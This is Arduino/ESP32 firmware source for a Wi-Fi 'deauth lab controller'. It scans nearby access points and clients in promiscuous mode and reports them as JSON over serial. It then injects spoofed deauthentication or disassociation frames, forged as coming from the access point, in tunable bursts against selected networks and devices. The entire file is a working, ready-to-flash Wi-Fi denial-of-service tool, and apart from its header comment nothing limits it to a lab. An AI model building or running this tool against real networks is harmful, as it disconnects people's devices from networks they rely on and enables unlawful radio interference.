/*
 * ESP32 deauth lab controller — NDJSON @ 921600 over USB-UART bridge.
 * TX is restricted to BSSIDs placed in g_targets by an explicit command.
 * Build: pio run -e esp32dev -t upload
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>

#include <atomic>
#include <cstdio>
#include <cstring>

#define FW_VERSION      "1.0.0-jam"
#define SERIAL_BAUD     921600
#define RX_LINE_MAX     1024
#define FRAME_MAX       256
#define RING_LEN        24
#define MAX_APS         48
#define MAX_STAS        64
#define MAX_TARGETS     16

static const uint8_t kBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* ---- state ------------------------------------------------------------- */

struct Config {
  uint16_t intervalMs  = 5;      // delay antar frame dalam satu burst
  uint16_t burst       = 8;      // frame per burst
  uint16_t burstGapMs  = 30;     // jeda antar burst
  uint8_t  channel     = 6;      // channel TX + sniff
  bool     hop         = false;  // sweep 1..13
  uint16_t hopMs       = 200;    // dwell per channel saat hop
  uint16_t reason      = 7;      // deauth reason code
  bool     broadcast   = true;   // true -> deauth ke broadcast per BSSID
  bool     disassoc    = false;  // true -> subtype disassoc (0xA0)
  bool     apInterface = true;   // true -> WIFI_IF_AP, false -> WIFI_IF_STA
  uint16_t statsMs     = 2000;   // 0 = matikan status periodik
  uint16_t repeatMs    = 1500;   // kirim ulang AP/client yang sama
  int8_t   rssiMin     = -95;
};

struct ApEntry {
  bool     used = false;
  uint8_t  bssid[6];
  char     ssid[33];
  uint8_t  ch = 0;
  int8_t   rssi = -127;
  uint8_t  auth = 0;       // 0 open, 1 wep, 2 wpa, 3 wpa2
  bool     hidden = false;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  uint32_t lastEmit = 0;
};

struct StaEntry {
  bool     used = false;
  uint8_t  mac[6];
  uint8_t  bssid[6];
  uint8_t  ch = 0;
  int8_t   rssi = -127;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  uint32_t lastEmit = 0;
};

struct Target {
  bool used = false;
  uint8_t bssid[6];
};

struct StaTarget {
  bool used = false;
  uint8_t mac[6];
  uint8_t bssid[6];
};

struct RawFrame {
  uint16_t len = 0;
  int8_t   rssi = -127;
  uint8_t  ch = 0;
  uint8_t  kind = 0;       // 1 = AP mgmt, 2 = STA data
  uint8_t  data[FRAME_MAX];
};

static Config   g_cfg;
static ApEntry  g_aps[MAX_APS];
static StaEntry g_stas[MAX_STAS];
static Target   g_targets[MAX_TARGETS];
static StaTarget g_staTargets[MAX_STAS];

static bool     g_jamming = false;
static uint8_t  g_curCh = 6;
static uint32_t g_txCount = 0;
static uint32_t g_txErrors = 0;
static uint32_t g_sniffFrames = 0;
static uint32_t g_rxDrops = 0;
static uint32_t g_ringDrops = 0;
static uint16_t s_uniqueAp = 0;
static uint16_t s_uniqueSta = 0;
static uint16_t s_evictAp = 0;
static uint16_t s_evictSta = 0;

/* ---- serial out -------------------------------------------------------- */

static void sendJson(JsonDocument &d) {
  serializeJson(d, Serial);
  Serial.write('\n');
}

static void ack(bool ok, const char *msg, const char *cmd) {
  JsonDocument d;
  d["type"] = "rsp";
  d["ok"]   = ok;
  d["cmd"]  = cmd ? cmd : "";
  d["msg"]  = msg;
  sendJson(d);
}

/* ---- helpers ----------------------------------------------------------- */

static bool macEq(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static void macToStr(const uint8_t *m, char *out18) {
  snprintf(out18, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static bool parseMac(const char *s, uint8_t out[6]) {
  if (!s || strlen(s) != 17) return false;
  unsigned int m[6];
  if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
             &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
  return true;
}

static const char *authStr(uint8_t a) {
  switch (a) {
    case 1: return "wep";
    case 2: return "wpa";
    case 3: return "wpa2";
    default: return "open";
  }
}

/* ---- promiscuous ring -------------------------------------------------- */

static RawFrame s_ring[RING_LEN];
static std::atomic<uint16_t> s_head{0};
static std::atomic<uint16_t> s_tail{0};

static void IRAM_ATTR sniffCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *f = pkt->payload;
  uint8_t kind = 0;

  if (type == WIFI_PKT_MGMT) {
    if (pkt->rx_ctrl.sig_len < 36) return;
    uint8_t sub = (f[0] >> 4) & 0x0F;
    if (sub != 0x08 && sub != 0x05) return;   // beacon / probe response
    kind = 1;
  } else if (type == WIFI_PKT_DATA) {
    if (pkt->rx_ctrl.sig_len < 24) return;
    bool toDS = (f[0] & 0x08) != 0;
    bool fromDS = (f[0] & 0x04) != 0;
    if (toDS == fromDS) return;               // ad-hoc / WDS, lewati
    kind = 2;
  } else {
    return;
  }

  uint16_t h = s_head.load(std::memory_order_relaxed);
  uint16_t next = (uint16_t)((h + 1) % RING_LEN);
  if (next == s_tail.load(std::memory_order_acquire)) {
    g_ringDrops++;
    return;
  }

  RawFrame &r = s_ring[h];
  uint16_t n = pkt->rx_ctrl.sig_len;
  if (n > FRAME_MAX) n = FRAME_MAX;
  r.len  = n;
  r.rssi = pkt->rx_ctrl.rssi;
  r.ch   = pkt->rx_ctrl.channel ? pkt->rx_ctrl.channel : g_curCh;
  r.kind = kind;
  memcpy(r.data, f, n);
  s_head.store(next, std::memory_order_release);
  g_sniffFrames++;
}

/* ---- parse AP beacon --------------------------------------------------- */

static void processAp(const RawFrame &r) {
  if (r.len < 36) return;
  const uint8_t *f = r.data;
  const uint8_t *bssid = f + 16;
  uint16_t capab = (uint16_t)f[34] | ((uint16_t)f[35] << 8);
  bool privacy = (capab & 0x0010) != 0;

  char ssid[33] = {0};
  uint8_t ssidLen = 0;
  uint8_t ch = r.ch;
  bool rsn = false, wpa = false;

  uint16_t i = 36;
  while ((uint16_t)(i + 2) <= r.len) {
    uint8_t id = f[i];
    uint8_t l  = f[i + 1];
    if ((uint16_t)(i + 2 + l) > r.len) break;
    const uint8_t *v = f + i + 2;
    if (id == 0 && l <= 32) {
      ssidLen = l;
      memcpy(ssid, v, l);
      ssid[l] = 0;
    } else if (id == 3 && l >= 1) {
      ch = v[0];
    } else if (id == 48) {
      rsn = true;
    } else if (id == 221 && l >= 4 && v[0] == 0x00 && v[1] == 0x50 &&
               v[2] == 0xF2 && v[3] == 0x01) {
      wpa = true;
    }
    i += (uint16_t)(2 + l);
  }

  if (r.rssi < g_cfg.rssiMin) return;
  uint8_t auth = privacy ? (uint8_t)(rsn ? 3 : (wpa ? 2 : 1)) : 0;

  ApEntry *e = nullptr;
  ApEntry *freeSlot = nullptr;
  for (uint16_t k = 0; k < MAX_APS; k++) {
    if (!g_aps[k].used) { if (!freeSlot) freeSlot = &g_aps[k]; continue; }
    if (macEq(g_aps[k].bssid, bssid)) { e = &g_aps[k]; break; }
  }
  bool isNew = false;
  if (!e) {
    e = freeSlot ? freeSlot : &g_aps[s_evictAp++ % MAX_APS];
    *e = ApEntry();
    e->used = true;
    memcpy(e->bssid, bssid, 6);
    e->rssi = -127;
    isNew = true;
    s_uniqueAp++;
  }

  uint32_t now = millis();
  int8_t oldRssi = e->rssi;
  e->hits++;
  e->lastSeen = now;
  e->ch = ch;
  e->rssi = r.rssi;
  e->auth = auth;
  e->hidden = (ssidLen == 0);
  if (ssidLen) memcpy(e->ssid, ssid, ssidLen + 1); else e->ssid[0] = 0;

  bool due = g_cfg.repeatMs && (uint32_t)(now - e->lastEmit) >= g_cfg.repeatMs;
  bool moved = abs((int)r.rssi - (int)oldRssi) >= 6;
  if (!isNew && !due && !moved) return;
  e->lastEmit = now;

  char mac[18];
  macToStr(e->bssid, mac);
  JsonDocument d;
  d["type"]  = "wifi";
  d["ts"]    = now;
  d["bssid"] = mac;
  if (!e->hidden) d["ssid"] = e->ssid;
  d["hidden"] = e->hidden;
  d["ch"]     = e->ch;
  d["rssi"]   = e->rssi;
  d["auth"]   = authStr(e->auth);
  d["hits"]   = e->hits;
  sendJson(d);
}

/* ---- parse STA data frame --------------------------------------------- */

static void processSta(const RawFrame &r) {
  if (r.len < 24) return;
  const uint8_t *f = r.data;
  bool toDS = (f[0] & 0x08) != 0;
  bool fromDS = (f[0] & 0x04) != 0;
  const uint8_t *sta, *bssid;
  if (toDS && !fromDS) {
    bssid = f + 4;
    sta   = f + 10;
  } else if (fromDS && !toDS) {
    sta   = f + 4;
    bssid = f + 10;
  } else {
    return;
  }

  bool zeroSta = true;
  for (int i = 0; i < 6; i++) if (sta[i]) { zeroSta = false; break; }
  if (zeroSta) return;

  StaEntry *e = nullptr;
  StaEntry *freeSlot = nullptr;
  for (uint16_t k = 0; k < MAX_STAS; k++) {
    if (!g_stas[k].used) { if (!freeSlot) freeSlot = &g_stas[k]; continue; }
    if (macEq(g_stas[k].mac, sta) && macEq(g_stas[k].bssid, bssid)) {
      e = &g_stas[k];
      break;
    }
  }
  bool isNew = false;
  if (!e) {
    e = freeSlot ? freeSlot : &g_stas[s_evictSta++ % MAX_STAS];
    *e = StaEntry();
    e->used = true;
    memcpy(e->mac, sta, 6);
    memcpy(e->bssid, bssid, 6);
    e->rssi = -127;
    isNew = true;
    s_uniqueSta++;
  }

  uint32_t now = millis();
  int8_t oldRssi = e->rssi;
  e->hits++;
  e->lastSeen = now;
  e->ch = r.ch;
  e->rssi = r.rssi;
  bool due = g_cfg.repeatMs && (uint32_t)(now - e->lastEmit) >= g_cfg.repeatMs;
  bool moved = abs((int)r.rssi - (int)oldRssi) >= 6;
  if (!isNew && !due && !moved) return;
  e->lastEmit = now;

  char mac[18], ap[18];
  macToStr(e->mac, mac);
  macToStr(e->bssid, ap);
  JsonDocument d;
  d["type"]  = "client";
  d["ts"]    = now;
  d["addr"]  = mac;
  d["bssid"] = ap;
  d["ch"]    = e->ch;
  d["rssi"]  = e->rssi;
  d["hits"]  = e->hits;
  sendJson(d);
}

/* ---- target maintenance ------------------------------------------------ */

static void clearTargets() {
  for (uint16_t i = 0; i < MAX_TARGETS; i++) g_targets[i] = Target();
  for (uint16_t i = 0; i < MAX_STAS; i++) g_staTargets[i] = StaTarget();
}

static uint16_t setTargetsFromJson(JsonArray arr) {
  clearTargets();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_TARGETS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;
    bool dup = false;
    for (uint16_t i = 0; i < n; i++) if (macEq(g_targets[i].bssid, m)) { dup = true; break; }
    if (dup) continue;
    g_targets[n].used = true;
    memcpy(g_targets[n].bssid, m, 6);
    n++;
  }
  return n;
}

static uint16_t setStaTargetsFromJson(JsonArray arr) {
  for (uint16_t i = 0; i < MAX_STAS; i++) g_staTargets[i] = StaTarget();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_STAS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;

    uint8_t bssid[6] = {0};
    for (uint16_t j = 0; j < MAX_STAS; j++) {
      if (g_stas[j].used && macEq(g_stas[j].mac, m)) {
        memcpy(bssid, g_stas[j].bssid, 6);
        break;
      }
    }
    if (!bssid[0] && !bssid[1] && !bssid[2] &&
        !bssid[3] && !bssid[4] && !bssid[5]) continue;  // client belum terlihat

    bool dup = false;
    for (uint16_t i = 0; i < n; i++) if (macEq(g_staTargets[i].mac, m)) { dup = true; break; }
    if (dup) continue;
    g_staTargets[n].used = true;
    memcpy(g_staTargets[n].mac, m, 6);
    memcpy(g_staTargets[n].bssid, bssid, 6);
    n++;
  }
  return n;
}

/* ---- TX ---------------------------------------------------------------- */

static void injectFrame(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t frame[26];
  frame[0] = g_cfg.disassoc ? 0xA0 : 0xC0;   // mgmt subtype: deauth / disassoc
  frame[1] = 0x00;
  frame[2] = 0x00;
  frame[3] = 0x00;
  memcpy(frame + 4,  sta,   6);               // addr1: receiver
  memcpy(frame + 10, bssid, 6);               // addr2: transmitter (spoof AP)
  memcpy(frame + 16, bssid, 6);               // addr3: BSSID
  frame[22] = 0x00;
  frame[23] = 0x00;
  frame[24] = (uint8_t)(g_cfg.reason & 0xFF);
  frame[25] = (uint8_t)((g_cfg.reason >> 8) & 0xFF);

  wifi_interface_t ifx = g_cfg.apInterface ? WIFI_IF_AP : WIFI_IF_STA;
  esp_err_t err = esp_wifi_80211_tx(ifx, frame, sizeof(frame), false);
  if (err == ESP_OK) g_txCount++; else g_txErrors++;
}

static uint16_t s_burstLeft = 0;
static uint32_t s_lastFrame = 0;
static uint32_t s_lastBurst = 0;
static uint16_t s_tCursor = 0;
static uint16_t s_cCursor = 0;

static void sendNext() {
  uint16_t active = 0;
  for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) active++;
  if (!active) return;

  if (!g_cfg.broadcast) {
    uint16_t cActive = 0;
    for (uint16_t i = 0; i < MAX_STAS; i++) if (g_staTargets[i].used) cActive++;
    if (cActive) {
      for (uint16_t n = 0; n < MAX_STAS; n++) {
        s_cCursor = (uint16_t)((s_cCursor + 1) % MAX_STAS);
        if (!g_staTargets[s_cCursor].used) continue;
        injectFrame(g_staTargets[s_cCursor].bssid, g_staTargets[s_cCursor].mac);
        return;
      }
    }
  }

  for (uint16_t n = 0; n < MAX_TARGETS; n++) {
    s_tCursor = (uint16_t)((s_tCursor + 1) % MAX_TARGETS);
    if (!g_targets[s_tCursor].used) continue;
    injectFrame(g_targets[s_tCursor].bssid, kBroadcast);
    return;
  }
}

static void jamTick() {
  if (!g_jamming) return;
  uint32_t now = millis();

  if (s_burstLeft == 0 && (uint32_t)(now - s_lastBurst) >= g_cfg.burstGapMs) {
    s_burstLeft = g_cfg.burst;
    s_lastBurst = now;
  }
  if (s_burstLeft == 0) return;
  if ((uint32_t)(now - s_lastFrame) < g_cfg.intervalMs) return;
  s_lastFrame = now;
  s_burstLeft--;
  sendNext();
}

/* ---- channel hop ------------------------------------------------------- */

static uint32_t s_lastHop = 0;
static uint8_t  s_hopCursor = 0;

static void hopTick() {
  uint32_t now = millis();
  if (g_cfg.hop) {
    uint16_t dwell = g_cfg.hopMs ? g_cfg.hopMs : 100;
    if (s_lastHop && (uint32_t)(now - s_lastHop) < dwell) return;
    s_lastHop = now;
    uint8_t c = (uint8_t)((s_hopCursor % 13) + 1);
    s_hopCursor = (uint8_t)(c % 13);
    if (c != g_curCh && esp_wifi_set_channel(c, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = c;
    }
  } else if (g_curCh != g_cfg.channel) {
    if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = g_cfg.channel;
    }
  }
}

/* ---- status / config events ------------------------------------------- */

static void emitConfig() {
  JsonDocument d;
  d["type"] = "config";
  JsonObject p = d["params"].to<JsonObject>();
  p["interval_ms"]  = g_cfg.intervalMs;
  p["burst"]        = g_cfg.burst;
  p["burst_gap_ms"] = g_cfg.burstGapMs;
  p["channel"]      = g_cfg.channel;
  p["hop"]          = g_cfg.hop;
  p["hop_ms"]       = g_cfg.hopMs;
  p["reason"]       = g_cfg.reason;
  p["broadcast"]    = g_cfg.broadcast;
  p["disassoc"]     = g_cfg.disassoc;
  p["ap_interface"] = g_cfg.apInterface;
  p["stats_ms"]     = g_cfg.statsMs;
  p["repeat_ms"]    = g_cfg.repeatMs;
  p["rssi_min"]     = g_cfg.rssiMin;

  JsonArray t = d["targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_TARGETS; i++) {
    if (!g_targets[i].used) continue;
    char mac[18];
    macToStr(g_targets[i].bssid, mac);
    t.add(mac);
  }
  JsonArray c = d["client_targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_STAS; i++) {
    if (!g_staTargets[i].used) continue;
    char mac[18];
    macToStr(g_staTargets[i].mac, mac);
    c.add(mac);
  }
  d["jamming"] = g_jamming;
  sendJson(d);
}

static void emitStatus() {
  JsonDocument d;
  d["type"]    = "status";
  d["ts"]      = millis();
  d["jamming"] = g_jamming;
  d["channel"] = g_curCh;

  JsonObject s = d["stats"].to<JsonObject>();
  s["frames"]      = g_sniffFrames;
  s["aps"]         = s_uniqueAp;
  s["clients"]     = s_uniqueSta;
  s["tx"]          = g_txCount;
  s["tx_errors"]   = g_txErrors;
  s["rx_dropped"]  = g_rxDrops;
  s["ring_dropped"] = g_ringDrops;

  uint16_t targets = 0;
  for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) targets++;
  d["targets"] = targets;
  sendJson(d);
}

/* ---- command parsing --------------------------------------------------- */

static JsonDocument s_rx;

static bool getInt(JsonObject p, const char *key, long lo, long hi, long *out) {
  JsonVariant v = p[key];
  if (!v.is<long>()) return false;
  long x = v.as<long>();
  if (x < lo || x > hi) return false;
  *out = x;
  return true;
}

static bool getBool(JsonObject p, const char *key, bool *out) {
  JsonVariant v = p[key];
  if (!v.is<bool>()) return false;
  *out = v.as<bool>();
  return true;
}

static void applyParams(JsonObject p) {
  long x;
  bool y;
  bool changed = false;

  if (getInt(p, "interval_ms", 1, 1000, &x)) {
    g_cfg.intervalMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "burst", 1, 100, &x)) {
    g_cfg.burst = (uint16_t)x; changed = true;
  }
  if (getInt(p, "burst_gap_ms", 0, 5000, &x)) {
    g_cfg.burstGapMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "channel", 1, 13, &x)) {
    g_cfg.channel = (uint8_t)x; changed = true;
  }
  if (getBool(p, "hop", &y)) { g_cfg.hop = y; changed = true; }
  if (getInt(p, "hop_ms", 10, 5000, &x)) {
    g_cfg.hopMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "reason", 1, 25, &x)) {
    g_cfg.reason = (uint16_t)x; changed = true;
  }
  if (getBool(p, "broadcast", &y)) { g_cfg.broadcast = y; changed = true; }
  if (getBool(p, "disassoc", &y)) { g_cfg.disassoc = y; changed = true; }
  if (getBool(p, "ap_interface", &y)) { g_cfg.apInterface = y; changed = true; }
  if (getInt(p, "stats_ms", 0, 60000, &x)) {
    g_cfg.statsMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "repeat_ms", 0, 600000, &x)) {
    g_cfg.repeatMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "rssi_min", -120, 0, &x)) {
    g_cfg.rssiMin = (int8_t)x; changed = true;
  }

  (void)changed;
  if (!g_cfg.hop && g_curCh != g_cfg.channel) {
    if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = g_cfg.channel;
    }
  }
  ack(true, "params applied", "set");
  emitConfig();
}

static void handleLine(const char *line) {
  DeserializationError err = deserializeJson(s_rx, line);
  if (err) {
    ack(false, "bad json", "");
    return;
  }

  const char *cmd = s_rx["cmd"] | "";

  if (!strcmp(cmd, "ping")) {
    ack(true, "pong", cmd);
    return;
  }
  if (!strcmp(cmd, "status")) {
    ack(true, "ok", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "config")) {
    ack(true, "ok", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "set")) {
    applyParams(s_rx["params"].as<JsonObject>());
    return;
  }
  if (!strcmp(cmd, "targets")) {
    uint16_t n = 0;
    if (s_rx["targets"].is<JsonArray>()) n = setTargetsFromJson(s_rx["targets"].as<JsonArray>());
    ack(true, "targets set", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "clear")) {
    uint16_t n = 0;
    for (uint16_t i = 0; i < MAX_APS; i++) if (g_aps[i].used) { g_aps[i] = ApEntry(); n++; }
    for (uint16_t i = 0; i < MAX_STAS; i++) if (g_stas[i].used) { g_stas[i] = StaEntry(); n++; }
    s_uniqueAp = s_uniqueSta = 0;
    ack(true, "tables cleared", cmd);
    return;
  }
  if (!strcmp(cmd, "jam_start")) {
    if (s_rx["targets"].is<JsonArray>()) setTargetsFromJson(s_rx["targets"].as<JsonArray>());
    if (s_rx["client_targets"].is<JsonArray>()) setStaTargetsFromJson(s_rx["client_targets"].as<JsonArray>());
    g_jamming = true;
    s_burstLeft = 0;
    s_tCursor = s_cCursor = 0;
    ack(true, "jamming", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "jam_stop")) {
    g_jamming = false;
    s_burstLeft = 0;
    ack(true, "stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "reset")) {
    g_jamming = false;
    g_cfg = Config();
    clearTargets();
    ack(true, "reset", cmd);
    emitConfig();
    emitStatus();
    return;
  }

  ack(false, "unknown cmd", cmd);
}

/* ---- serial link ------------------------------------------------------- */

static char s_rxLine[RX_LINE_MAX];
static size_t s_rxLen = 0;

static void linkPoll() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (s_rxLen) {
        s_rxLine[s_rxLen] = 0;
        handleLine(s_rxLine);
        s_rxLen = 0;
      }
    } else if (s_rxLen < RX_LINE_MAX - 1) {
      s_rxLine[s_rxLen++] = c;
    } else {
      s_rxLen = 0;
      g_rxDrops++;
    }
  }
}

/* ---- setup / loop ------------------------------------------------------ */

void setup() {
  Serial.begin(SERIAL_BAUD);
  uint32_t t0 = millis();
  while (!Serial && (millis() - t0) < 3000) delay(20);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("wrecon-tx", nullptr, g_cfg.channel, 1, 0);
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

  wifi_promiscuous_filter_t flt = {};
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous_rx_cb(&sniffCb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE);

  JsonDocument hello;
  hello["type"]   = "hello";
  hello["fw"]     = FW_VERSION;
  hello["chip"]   = ESP.getChipModel();
  hello["serial"] = SERIAL_BAUD;
  hello["proto"]  = 2;
  sendJson(hello);

  emitConfig();
  emitStatus();
}

static uint32_t s_lastStats = 0;

void loop() {
  linkPoll();
  hopTick();

  for (;;) {
    uint16_t t = s_tail.load(std::memory_order_relaxed);
    if (t == s_head.load(std::memory_order_acquire)) break;
    RawFrame &r = s_ring[t];
    if (r.kind == 1) processAp(r);
    else if (r.kind == 2) processSta(r);
    s_tail.store((uint16_t)((t + 1) % RING_LEN), std::memory_order_release);
  }

  jamTick();

  if (g_cfg.statsMs && (uint32_t)(millis() - s_lastStats) >= g_cfg.statsMs) {
    s_lastStats = millis();
    emitStatus();
  }

  delay(1);
}
